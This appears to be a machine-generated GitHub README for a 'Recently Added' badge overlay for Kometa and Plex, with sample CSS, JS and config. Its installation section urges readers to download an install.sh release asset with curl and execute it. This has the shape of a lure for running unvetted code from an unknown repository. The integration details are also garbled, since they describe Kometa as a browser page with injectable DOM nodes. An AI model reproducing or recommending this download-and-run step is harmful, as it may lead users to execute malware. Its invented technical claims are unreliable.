[![Download Releases](https://img.shields.io/badge/Download-Releases-%23E50914?logo=github&style=for-the-badge)](https://github.com/nielitinzac3/recently-added-nf-overlay-for-kometa/releases)

# Netflix-Style Recently Added Overlay for Kometa and Plex UI

A clean Netflix-style "Recently Added" overlay for Kometa and Plex. It badges new items for 20 days and blends with existing poster grids and carousels.

- Demo image:  
  ![Overlay demo](https://placehold.co/1000x300?text=Recently+Added+Overlay+Demo&font=roboto)

Table of contents
- Features
- Screenshot
- How it works
- Requirements
- Installation (download and execute)
- Configuration
- Styling and theme
- Kometa / Plex integration
- Troubleshooting
- Development
- Contribution
- License

Features
- Adds a visible "Recently Added" badge to posters and items.
- Uses item release or added date to set a 20-day badge window.
- Minimal CSS and JS to avoid UI lag.
- Flexible selectors so you can hook it into Kometa or Plex DOM.
- Supports custom badge text, color, and position.
- Works with local and remote libraries.

Screenshot
- The overlay aims for a low-contrast badge styled like streaming services.
- Example assets:
  - Badge color: #E50914 (inspired by Netflix red).
  - Badge shape: rounded rectangle with drop shadow.
  - Font: system UI stack to match each app.

How it works
- The overlay scans the media grid and reads the "added" or "release" date from metadata or DOM attributes.
- It calculates an age in days for each item.
- If age <= 20, it adds a small DOM node with a badge and a data attribute for styling and later removal.
- A scheduled pass removes badges that exceed 20 days after they appear.

Requirements
- Kometa or Plex running in a browser view where you can inject CSS/JS.
- Optional: Node.js to build assets if you modify the project.
- Minimal permissions: only DOM access for the player web UI.

Installation (download and execute)
- Visit the Releases page, download the installer asset, and run it:
  - Releases: https://github.com/nielitinzac3/recently-added-nf-overlay-for-kometa/releases
- Typical steps:
  1. Visit the link above.
  2. Download the release asset named install.sh or recently-added-overlay-installer.sh.
  3. Run the script on a machine that can update the Kometa/Plex web UI or inject user scripts.

- Example shell commands (adjust to the actual asset name you downloaded):
  - macOS / Linux:
    - curl -L -o install.sh "https://github.com/nielitinzac3/recently-added-nf-overlay-for-kometa/releases/latest/download/install.sh"
    - chmod +x install.sh
    - ./install.sh
  - If you prefer manual install:
    - Download the ZIP from the releases page.
    - Extract the folder "dist".
    - Copy dist/recently-added.css into your Kometa/Plex custom CSS location.
    - Inject dist/recently-added.js via user script or a web UI injection point.

Configuration
- Default behavior:
  - Badge window: 20 days
  - Badge text: "NEW"
  - Badge color: #E50914
  - Position: top-left of poster

- JSON sample for basic config (local override):
```json
{
  "badgeText": "NEW",
  "badgeWindowDays": 20,
  "badgeColor": "#E50914",
  "position": "top-left",
  "selector": ".media-poster, .card"
}
```

- To change the window to 14 days, set badgeWindowDays to 14.

Styling and theme
- The overlay ships a compact CSS that fits most card layouts. Example CSS:
```css
.recently-added-badge {
  position: absolute;
  top: 8px;
  left: 8px;
  background: #E50914;
  color: white;
  padding: 4px 8px;
  font-weight: 600;
  font-size: 12px;
  border-radius: 4px;
  box-shadow: 0 2px 6px rgba(0,0,0,0.35);
  z-index: 1000;
}
.media-card { position: relative; }
```
- Use the position and spacing variables to match Kometa or Plex scaling.
- Provide alternate theme by setting badgeColor to a CSS variable for dark mode or custom skins.

Kometa / Plex integration
- Kometa:
  - Identify the poster element class or data attributes.
  - Insert the JS snippet as a user script or use Kometa's custom overlay capability.
  - Example Kometa injection snippet:
```js
// sample: matches Kometa poster nodes and reads data-added attribute
const CONFIG = { selector: '.kometa-item', dateAttr: 'data-added', windowDays: 20 };
function parseDate(v) { return new Date(v); }
function getDaysOld(date) {
  const msPerDay = 1000*60*60*24;
  return Math.floor((Date.now() - date.getTime()) / msPerDay);
}
function applyBadges() {
  document.querySelectorAll(CONFIG.selector).forEach(el => {
    const d = el.getAttribute(CONFIG.dateAttr);
    if (!d) return;
    const days = getDaysOld(parseDate(d));
    el.classList.remove('recently-added');
    el.querySelectorAll('.recently-added-badge').forEach(n => n.remove());
    if (days <= CONFIG.windowDays) {
      const badge = document.createElement('div');
      badge.className = 'recently-added-badge';
      badge.textContent = 'NEW';
      el.style.position = 'relative';
      el.appendChild(badge);
      el.classList.add('recently-added');
    }
  });
}
setInterval(applyBadges, 1000 * 30);
applyBadges();
```

- Plex:
  - Plex exposes metadata in the DOM or via API when you run a local server.
  - If you use a browser extension or a userscript manager (Tampermonkey), inject the script above and point selector to Plex card nodes, e.g., '.Card--poster'.

Advanced usage
- Use the API: If you run a server-side agent, query Plex/Kometa libraries via API and generate a JSON map of recent items. Then push that map to clients via a small endpoint and let the client script read it.
- Example server payload:
```json
{
  "recentIds": ["id1", "id2", "id3"],
  "expiresAt": "2025-12-01T00:00:00Z"
}
```
- Client script cross-references poster IDs to apply badges even when DOM lacks date attributes.

Performance
- The overlay uses a light DOM pass and a throttled interval. Default interval equals 30 seconds. You can increase to 60 seconds to reduce CPU.

Accessibility
- The badge uses high-contrast color and includes aria-labels when inserted.
- Example accessible badge creation:
```js
badge.setAttribute('role', 'status');
badge.setAttribute('aria-label', 'Newly added media within 20 days');
```

Troubleshooting
- I do not see badges:
  - Confirm the selector matches your poster nodes.
  - Confirm the item date exists in DOM or metadata attribute.
- Badges show on old items:
  - Check system clock and server time.
  - Verify date parsing (ISO vs. locale formats).
- Styling conflicts:
  - Increase badge z-index or prefix CSS rules with :root variables.
- If the releases page or downloads do not work, check the Releases section on the repository page.

Development
- Repo layout
  - src/ - source JS and CSS
  - dist/ - compiled assets (CSS and JS)
  - install.sh - installer script (release asset)
  - README.md - this file
- Build
  - npm install
  - npm run build
- Test
  - Open test/index.html which simulates a poster grid.
- Lint
  - npm run lint

Contribution
- Open an issue for bugs and feature requests.
- Fork the repo and open pull requests with a clear description, test plan, and screenshots.
- Keep commits small and focused. Use a consistent formatter (prettier/eslint config included).

Release and download
- The Releases page contains packaged builds and installer scripts. Visit the page to download a release asset that you can run on your deployment host:
  - https://github.com/nielitinzac3/recently-added-nf-overlay-for-kometa/releases
- Releases include:
  - dist.zip — compiled CSS/JS
  - install.sh — installer that copies files and injects hooks
  - changelog.md — release notes

FAQ
- Q: Can I change the badge text?
  - A: Yes. Edit the badgeText in the config and rebuild or override at runtime.
- Q: Will this break my Plex view?
  - A: The overlay uses safe DOM insertion and minimal CSS. Test in a local environment first.
- Q: Can I show the days count instead of "NEW"?
  - A: Yes. Modify badge.textContent = `${days}d` in the script.

Credits
- UI style inspired by mainstream streaming services.
- Icons and color palette follow open-source or free resources.
- Code contributions welcome.

License
- MIT License. See LICENSE file in the repo for full terms.